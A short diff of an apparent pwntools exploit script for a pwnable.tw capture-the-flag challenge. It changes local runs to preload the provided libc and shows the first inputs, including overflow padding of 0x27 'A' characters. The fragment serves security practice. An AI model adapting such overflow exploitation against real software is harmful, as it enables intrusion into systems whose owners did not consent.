@@ -6,7 +6,7 @@ libc = ELF("./libc.so.6")
 if "--remote" in sys.argv:
   p = remote("chall.pwnable.tw", 10306)
 else:
-  p = process(e.path)
+  p = process(e.path, {"LD_PRELOAD": "./libc.so.6"})
 
 p.sendlineafter(":", "A")
 p.sendlineafter(":", "A" * (0x28 - 1))
